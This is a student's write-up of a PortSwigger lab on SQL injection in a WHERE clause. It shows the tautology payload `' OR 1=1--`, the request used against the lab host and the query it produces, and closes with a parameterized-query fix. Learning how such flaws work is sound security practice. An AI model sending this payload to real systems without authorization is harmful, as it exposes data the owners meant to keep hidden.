# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- **Platform:** PortSwigger
- **Topic:** SQL injection
- **Difficulty:** Apprentice
- **Date:** 2026-11-12
- **Link:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

## Goal
Get all data back, including unreleased products that are normally hidden.

## Recon: what I noticed
The `category` URL parameter filters what products show up on the page, so it's probably going straight into a SQL `WHERE` clause.

## Exploit, step by step
1. Found the `category` parameter in the URL.
2. Changed its value to `'+OR+1=1--`.
3. Sent the request — the page returned all products, including the unreleased ones.

```http
GET /filter?category='+OR+1=1-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

## Why it works (root cause)
The backend is gluing the `category` input straight into the SQL query, something like:

```sql
SELECT * FROM products WHERE category = '<input>' AND released = 1
```

With `' OR 1=1--`, the query becomes:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

The `'` closes the string, `OR 1=1` makes the condition always `true`, and `--` comments out `AND released = 1`. Since `WHERE` is now always true, the database dumps every product.

## How to fix it
Use parameterized queries instead of string concatenation so the database treats input as data, not SQL code.

```js
// Node.js (pg)
await db.query(
  'SELECT * FROM products WHERE category = $1 AND released = 1',
  [req.query.category]
);
```

## What I learned
Always test filter parameters in the URL first. Adding `' OR 1=1--` is a quick way to check if input breaks out of a `WHERE` clause and bypasses extra checks like `released = 1`.
